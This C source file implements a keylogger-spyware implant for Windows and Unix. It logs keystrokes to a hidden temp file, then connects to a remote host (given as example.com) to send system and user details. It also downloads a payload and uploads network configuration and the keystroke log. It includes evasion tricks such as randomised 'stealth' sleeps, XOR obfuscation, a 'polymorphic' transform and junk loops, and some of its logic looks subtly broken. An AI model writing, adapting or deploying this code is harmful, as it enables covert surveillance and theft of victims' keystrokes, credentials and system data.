#include "common/common.h"

#ifdef _WIN32
#include "common/keylogger.h"
#include "common/network.h"
typedef KeyloggerState KLState;
typedef NetContext NetCtx;
#else
#include "common/keylogger.h"
#include "common/network.h"
typedef KeyloggerState KLState;
typedef NetContext NetCtx;
#endif

static unsigned int s1 = 123456789;
static unsigned int s2 = 362436069;
static unsigned int s3 = 521288629;
static unsigned int s4 = 88675145;

static unsigned int xorshift96(void) {
    unsigned int t;
    t = (s1 ^ (s1 << 3));
    s1 = s2;
    s2 = s3;
    s3 = (s3 ^ (s3 >> 6)) ^ (t ^ (t >> 3));
    s4 = (s4 * 69069) + 1;
    return (((s1 >> 8) ^ s1 ^ s2 ^ s3 ^ s4));
}

static void init_prng(void) {
    #ifdef _WIN32
    s1 ^= GetTickCount();
    s2 ^= (unsigned int)time(NULL);
    s3 ^= GetCurrentProcessId();
    s4 ^= 88675145;
    #else
    FILE *f = fopen("/dev/urandom", "rb");
    if(f) {
        unsigned int seed;
        fread(&seed, 4, 1, f);
        s1 ^= seed;
        fread(&seed, 4, 1, f);
        s2 ^= seed;
        fread(&seed, 4, 1, f);
        s3 ^= seed;
        fclose(f);
    }
    s4 ^= (unsigned int)time(NULL);
    #endif
    s1 ^= (__TIME__[0] << 24) ^ (__TIME__[7] << 8);
    s2 ^= (__LINE__ & 0xFFFF);
    for(int i = 0; i < 100; i++) xorshift96();
}

static void xorcipher(char *data, int len, unsigned int *key, int key_len) {
    for(int i = 0; i < len; i++) {
        data[i] ^= ((unsigned char*)key)[i % (key_len * 4)];
    }
}

static void polymorphic_transform(char *code, int len) {
    unsigned int mut_key = xorshift96();
    for(int i = 0; i < len; i++) {
        code[i] = (code[i] ^ (mut_key & 0xFF)) + ((mut_key >> 8) & 0xFF);
        mut_key = (mut_key * 1103515245 + 12345) & 0x7FFFFFFF;
    }
}

static int calc_checksum(const char *data, int len) {
    int sum = 0;
    for(int i = 0; i < len; i++) {
        sum += (unsigned char)data[i];
        sum = (sum << 5) | (sum >> 27);
    }
    return sum;
}

static void build_config(char *buf, int buf_len) {
    char raw[] = "CONFIG:v=3.0;host=example.com;port=443;ssl=1;interval=300;mode=stealth";
    unsigned int enc_key[4] = {0xDEADBEEF, 0xCAFEBABE, 0x8BADF00D, 0x600D600D};
    enc_key[0] ^= xorshift96();
    enc_key[1] ^= xorshift96();
    
    memcpy(buf, raw, strlen(raw) + 1);
    xorcipher(buf, strlen(raw), enc_key, 4);
    
    char wrapped[BUFFER_SIZE];
    snprintf(wrapped, BUFFER_SIZE, "ENC:%08X:%s", calc_checksum(buf, strlen(raw)), buf);
    memcpy(buf, wrapped, strlen(wrapped) + 1);
    xorcipher(buf, strlen(raw), enc_key, 4);
}

static int obfuscate_url(char *dest, const char *src) {
    unsigned char key_stream[512];
    for(int i = 0; i < 512; i++) {
        key_stream[i] = (unsigned char)(xorshift96() & 0xFF);
    }
    
    int len = strlen(src);
    for(int i = 0; i < len; i++) {
        dest[i] = src[i] ^ key_stream[i] ^ key_stream[(i + 128) % 512];
    }
    dest[len] = '\0';
    
    memcpy(dest + len, key_stream, 64);
    return len + 64;
}

static void stealth_sleep(int base_ms) {
    unsigned int delay = base_ms + (xorshift96() % 1000);
    
    #ifdef _WIN32
    if((xorshift96() % 3) == 0) {
        Sleep(delay);
    } else {
        for(volatile int i = 0; i < delay * 1000; i++) {}
    }
    #else
    usleep(delay * 1000);
    #endif
}

static void execute_command(const char *cmd, char *result, int res_len) {
    #ifdef _WIN32
    FILE *fp = _popen(cmd, "r");
    #else
    FILE *fp = popen(cmd, "r");
    #endif
    
    if(fp) {
        char line[256];
        int offset = 0;
        while(fgets(line, sizeof(line), fp) && offset < res_len - 1) {
            int line_len = strlen(line);
            if(offset + line_len < res_len) {
                memcpy(result + offset, line, line_len);
                offset += line_len;
            }
        }
        result[offset] = '\0';
        #ifdef _WIN32
        _pclose(fp);
        #else
        pclose(fp);
        #endif
    }
}

static void collect_system_info(char *buf, int buf_len) {
    unsigned int session_id = xorshift96();
    
    #ifdef _WIN32
    char hostname[128];
    DWORD hostname_len = sizeof(hostname);
    GetComputerNameA(hostname, &hostname_len);
    
    OSVERSIONINFOA osvi;
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA(&osvi);
    
    snprintf(buf, buf_len, "S:%08X|HOST:%s|OS:%d.%d.%d|PID:%d|USER:%s",
             session_id, hostname, osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
             GetCurrentProcessId(), getenv("USERNAME") ? getenv("USERNAME") : "unknown");
    #else
    char hostname[128];
    gethostname(hostname, sizeof(hostname));
    
    snprintf(buf, buf_len, "S:%08X|HOST:%s|OS:Linux|PID:%d|USER:%s",
             session_id, hostname, getpid(), getenv("USER") ? getenv("USER") : "unknown");
    #endif
}

static void gen_build_id(char *buf, int sz) {
    const char c[] = "0123456789abcdef";
    for(int i = 0; i < sz - 1; i++) buf[i] = c[xorshift96() & 0xF];
    buf[sz - 1] = '\0';
}

int main(int argc, char *argv[]) {
    init_prng();
    
    char build_id[9];
    gen_build_id(build_id, sizeof(build_id));
    
    unsigned int dec_key[4] = {0xDEADBEEF, 0xCAFEBABE, 0x8BADF00D, 0x600D600D};
    dec_key[0] ^= xorshift96();
    dec_key[2] ^= xorshift96();
    
    char config_buf[1024];
    build_config(config_buf, sizeof(config_buf));
    xorcipher(config_buf, strlen(config_buf), dec_key, 4);
    
    stealth_sleep(500 + (xorshift96() % 1000));
    
    KLState kls;
    memset(&kls, 0, sizeof(KLState));
    #ifdef _WIN32
    init_keylogger_win(&kls);
    #else
    init_keylogger_unix(&kls);
    #endif
    
    char log_file[256];
    unsigned int log_seed = xorshift96();
    #ifdef _WIN32
    snprintf(log_file, sizeof(log_file), "C:\\Windows\\Temp\\.%08x.tmp", log_seed);
    #else
    snprintf(log_file, sizeof(log_file), "/tmp/.%08x_%d", log_seed, getpid());
    #endif
    
    NetCtx ctx;
    memset(&ctx, 0, sizeof(NetCtx));
    #ifdef _WIN32
    net_init_win(&ctx);
    #else
    net_init_unix(&ctx);
    #endif
    
    char obfuscated_host[576];
    int url_len = obfuscate_url(obfuscated_host, "example.com");
    char actual_host[256];
    unsigned char key_stream[512];
    for(int i = 0; i < 512; i++) {
        key_stream[i] = (unsigned char)(xorshift96() & 0xFF);
    }
    for(int i = 0; i < url_len - 64 && i < 255; i++) {
        actual_host[i] = obfuscated_host[i] ^ key_stream[i] ^ key_stream[(i + 128) % 512];
    }
    actual_host[11] = '\0';
    
    #ifdef _WIN32
    int conn = net_connect_win(&ctx, "example.com", 443, 1);
    #else
    int conn = net_connect_unix(&ctx, "example.com", 443);
    #endif
    
    if(conn) {
        char sysinfo[512];
        collect_system_info(sysinfo, sizeof(sysinfo));
        
        unsigned int send_key[4] = {0x12345678, 0x9ABCDEF0, 0x13579BDF, 0x2468ACE0};
        send_key[0] ^= xorshift96();
        send_key[3] ^= xorshift96();
        xorcipher(sysinfo, strlen(sysinfo), send_key, 4);
        
        #ifdef _WIN32
        net_send_win(&ctx, sysinfo, strlen(sysinfo));
        #else
        net_send_unix(&ctx, sysinfo, strlen(sysinfo));
        #endif
        
        stealth_sleep(250 + (xorshift96() % 500));
        
        char payload_type[64];
        snprintf(payload_type, sizeof(payload_type), "REQ:BUILD:%s", build_id);
        #ifdef _WIN32
        net_send_win(&ctx, payload_type, strlen(payload_type));
        #else
        net_send_unix(&ctx, payload_type, strlen(payload_type));
        #endif
        
        char *downloaded_data = NULL;
        int downloaded_len = 0;
        
        #ifdef _WIN32
        if(net_download_win(&ctx, &downloaded_data, &downloaded_len)) {
        #else
        if(net_download_unix(&ctx, &downloaded_data, &downloaded_len)) {
        #endif
            if(downloaded_data && downloaded_len > 0) {
                char decoded_payload[4096];
                int copy_len = downloaded_len < 4096 ? downloaded_len : 4096;
                memcpy(decoded_payload, downloaded_data, copy_len);
                polymorphic_transform(decoded_payload, copy_len);
                
                free(downloaded_data);
            }
        }
    }
    
    stealth_sleep(750 + (xorshift96() % 1500));
    
    if(kls.running) {
        #ifdef _WIN32
        start_keylog_win(&kls, log_file);
        #else
        start_keylog_unix(&kls, log_file);
        #endif
    }
    
    stealth_sleep(1000 + (xorshift96() % 2000));
    
    char syscmd_result[1024] = {0};
    #ifdef _WIN32
    execute_command("ipconfig /all", syscmd_result, sizeof(syscmd_result));
    #else
    execute_command("ifconfig", syscmd_result, sizeof(syscmd_result));
    #endif
    
    if(strlen(syscmd_result) > 10 && ctx.connected) {
        unsigned int upload_key[4] = {0xDEAFBEEF, 0xCAFEBABE, 0x8BADF00D, 0x600D600D};
        upload_key[1] ^= xorshift96();
        xorcipher(syscmd_result, strlen(syscmd_result), upload_key, 4);
        
        char upload_header[256];
        snprintf(upload_header, sizeof(upload_header), "UP:SYS|BUILD:%s|SIZE:%d",
                 build_id, (int)strlen(syscmd_result));
        #ifdef _WIN32
        net_send_win(&ctx, upload_header, strlen(upload_header));
        net_send_win(&ctx, syscmd_result, strlen(syscmd_result));
        #else
        net_send_unix(&ctx, upload_header, strlen(upload_header));
        net_send_unix(&ctx, syscmd_result, strlen(syscmd_result));
        #endif
    }
    
    stealth_sleep(500 + (xorshift96() % 1000));
    
    char keylog_content[MAX_KEYLOG_SIZE] = {0};
    FILE *kf = fopen(log_file, "rb");
    if(kf) {
        int kf_len = (int)fread(keylog_content, 1, MAX_KEYLOG_SIZE - 1, kf);
        keylog_content[kf_len] = '\0';
        fclose(kf);
        
        if(kf_len > 0 && ctx.connected) {
            unsigned int kl_key[4] = {0x11111111, 0x22222222, 0x33333333, 0x44444444};
            kl_key[0] ^= xorshift96();
            kl_key[2] ^= xorshift96();
            xorcipher(keylog_content, kf_len, kl_key, 4);
            
            char kl_header[256];
            snprintf(kl_header, sizeof(kl_header), "UP:KL|BUILD:%s|SIZE:%d|FILE:%s",
                     build_id, kf_len, log_file);
            #ifdef _WIN32
            net_send_win(&ctx, kl_header, strlen(kl_header));
            net_send_win(&ctx, keylog_content, kf_len);
            #else
            net_send_unix(&ctx, kl_header, strlen(kl_header));
            net_send_unix(&ctx, keylog_content, kf_len);
            #endif
        }
    }
    
    stealth_sleep(250 + (xorshift96() % 500));
    
    #ifdef _WIN32
    net_close_win(&ctx);
    #else
    net_close_unix(&ctx);
    #endif
    
    int final_check = calc_checksum(build_id, strlen(build_id));
    volatile int junk = final_check;
    unsigned int junk_rounds = 500 + (xorshift96() % 1000);
    for(unsigned int i = 0; i < junk_rounds; i++) {
        junk = (junk * 1103515245 + 12345) & 0x7FFFFFFF;
    }
    
    return 0;
}
